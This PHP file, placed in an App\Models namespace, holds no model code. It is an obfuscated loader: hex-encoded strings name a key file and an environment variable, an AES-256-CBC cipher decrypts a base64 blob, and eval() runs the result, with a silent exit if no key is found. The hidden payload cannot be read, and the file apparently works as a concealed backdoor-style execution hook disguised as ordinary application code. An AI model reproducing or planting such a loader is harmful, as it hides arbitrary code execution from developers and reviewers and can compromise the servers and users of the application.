<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Cuily1Qgwkh1lSDAi7KPZg==');

$c=base64_decode(

'oeXWF3wmpBfBBmwKUl4wsw832uAh4eih3Ps20HIGEMOfVsUYpHgrB8KG6NTzNKKm9VRwCIStUDUl' .
'G2xDvTWvObwwlM2McxO5t7HnVhttqn8E755VMdanmJmJQrY2x1PTz02p0B4s55OoLut75LOdjj0I' .
'r7+t6boTJLGq/rrnfl7N32sF6r7MXphfXxlrpxGjDNJR59iwh+XAgCGwpH5ut/O4c4l96wL0ji7x' .
'HhoNVqndWmZU2WP+TsaFpz+PyEi2YK6daE2WtGF7Rd7ptqG752hMmxppIiXHAWdfRApMPe78IIl7' .
'J02Y/L7v7d2UwcczCJeyMdZMAnLjOrX+opVVqc4qWKMx75Gt8rN3K9ZZbaICWJQn9T8w+tKJyZsO' .
'JmQmI5kAlaaAlY8cwyWTG3qPNwL4F2+ojuhimHd+1mDZWptuGrsahQzdGyaISMVSEtdJt1+7s09E' .
'j6JlhEYcOx9CYI4VGJW5DHJfMSgxnGazRHNkSpJpP+wamcnXIgBl1B2th7fB38LakgBLCnfquKpH' .
'f363WtKVMXKTDBhpfZ3s36NPjKtgtSJElOHjotw4XSo/Vh5wqnuIQIM7rJ522nTPaEbIq4R6OLFx' .
'6OsmXTnfAQ3FqWUafTKWuc6MNAPFo2lHzH343mGxAk2kB/pwC6ERfYyZ9hz0USBtmDQddU3hHvwH' .
'noHqQT5ZHvYAgLJvQxCifvBR0wIF2WU74vS9zUx0hBoW+PS1k9hvCsR/yUjsSUn9k0NaOK9ZEAl9' .
'qFYBlCFuh3Z9P5R5QcfZBDazx84xdR5LhldNCNJckdf3LuSu8u6U8xfxliYr4oA4HJRG1HkgnsG5' .
'AI4mF8iQ+QNom732bwqriIcj79Nfi3rqt5EGEPYgsUK8eQ/ifaQyvfKypF57'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

